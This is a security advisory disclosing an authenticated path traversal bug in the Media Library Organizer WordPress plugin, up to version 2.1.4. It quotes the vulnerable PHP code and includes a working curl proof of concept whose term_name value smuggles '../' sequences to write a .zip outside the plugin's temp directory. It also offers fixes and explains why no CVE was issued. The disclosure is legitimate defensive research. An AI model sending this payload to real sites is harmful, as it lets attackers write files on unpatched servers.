# Media Library Organizer (WordPress plugin) ≤ 2.1.4 — Authenticated Path Traversal to Arbitrary File Write

| | |
|---|---|
| **Target** | Media Library Organizer WordPress plugin, v2.1.4 (latest at time of testing) |
| **Vulnerability class** | CWE-22 (Path Traversal → Arbitrary File Write, constrained to `.zip`) |
| **Access required** | Authenticated, Editor role (`manage_categories` capability) |
| **Status** | Confirmed, live PoC. **Reported to vendor. No CVE was issued** — Patchstack requires full control over both path *and* extension for file-write bugs, and this PoC only controls the path (the extension is hardcoded to `.zip`). Wordfence's threshold for this bug class also exceeds the plugin's ~20,000 install count. |

> Responsible disclosure notice: tested in an isolated local Docker WordPress environment only.
> The vendor was notified before this write-up was published.

## Summary

The plugin registers a REST route, `POST /wp-json/mlo/download-folder`, that builds a ZIP export
filename directly from a user-supplied `term_name` parameter. That parameter only goes through
`sanitize_text_field()` — which strips tags and line breaks, but **not** `../` traversal sequences
— before being handed straight to `ZipArchive::open()` with no `realpath()` containment check.

```php
// includes/global/class-media-library-organizer-rest.php :: download_folder()
$term_name  = sanitize_text_field( wp_unslash( $request->get_param( 'term_name' ) ) );
$folder_path = Media_Library_Organizer()->get_class( 'filesystem' )->get_tmp_folder();
$file_path  = $folder_path . '/wp-media-lib-img-export-' . $term_name . '.zip';

$zip = new ZipArchive();
if ( ! $zip->open( $file_path, ZIPARCHIVE::CREATE ) ) {
    wp_send_json_error( ... );
}
```

The route's `permission_callback` requires `current_user_can('manage_categories')` — granted by
default to the **Editor** role, not just Administrator — but defines **no `args` schema** for
`term_name`, unlike sibling routes in the same file (e.g. `/add-folder`) which do validate their
input.

## The extra wrinkle that hid the bug during testing

`ZipArchive::open()` and `->close()`'s return values are never checked before the endpoint replies
with `wp_send_json_success()`. The response reports success unconditionally — including when the
write silently failed. This masked the vulnerability at first, and also meant the traversal payload
had to start with a leading `/` so the fixed `wp-media-lib-img-export-` prefix formed a clean path
segment boundary before the `../` sequences took effect.

## Proof of Concept

Environment: WordPress (Docker, `wordpress:latest`), plugin v2.1.4, logged in as a user with the
**Editor** role (not Administrator).

```bash
$ curl -s -c cookies.txt -b cookies.txt -H "X-WP-Nonce: 0c2f2e550f" -X POST \
    --data-urlencode "term_id=all-files" \
    --data-urlencode "term_name=/../../../../../../tmp/poc-traversal2" \
    "http://localhost:8099/wp-json/mlo/download-folder"

{"success":true,"data":{"file":"poc-traversal2.zip", ...}}

$ ls -la /var/tmp/poc-traversal2.zip
-rw-r--r-- 1 www-data www-data 402 Sep 25 10:39 /var/tmp/poc-traversal2.zip

$ file /var/tmp/poc-traversal2.zip
/var/tmp/poc-traversal2.zip: Zip archive data, made by v6.3 UNIX, ...
```

A real ZIP archive was written to `/var/tmp/`, completely outside the plugin's intended
`wp-content/uploads/media-library-organizer-temp/` sandbox, using nothing more than an Editor
account — no Administrator access required.

## Impact

- An Editor-level account (a role WordPress grants to non-technical content managers, not just
  site owners) can write an arbitrary `.zip` file to any filesystem location the web server process
  can write to, including outside the web root.
- Depending on server configuration, this could overwrite existing `.zip`-suffixed files the web
  server can write to, or, combined with another mechanism that later processes `.zip` files from a
  predictable location, be chained further.

## Suggested fix

- Add a `validate_callback` / `sanitize_callback` to the `/download-folder` route's `args` schema
  for `term_name` that rejects any value containing `/`, `\`, or `..` — mirroring the
  `sanitize_key`-based validation the plugin already uses on the sibling `/delete-folder` route.
- After building `$file_path`, verify with `realpath()` that it resolves inside the intended temp
  directory before calling `ZipArchive::open()`, and abort otherwise.
- Check the return value of both `ZipArchive::open()` and `ZipArchive::close()`, and only report
  success when the write genuinely succeeded.

## Why this didn't get a CVE

Patchstack's accepted-vulnerability-types list requires **full control over both the path and the
extension** for file-write / file-upload bugs. This PoC only demonstrates path control — the
extension is hardcoded to `.zip` by the plugin itself — so it falls short of that bar even though
the write location itself is fully attacker-controlled. Wordfence's program would place this in its
general "All Other Vulnerabilities" bucket, which requires ≥50,000 active installs for a new
researcher; this plugin has roughly 20,000. As with the other findings here, this is a triage
threshold, not a statement that the bug isn't real — the vendor was notified directly regardless.
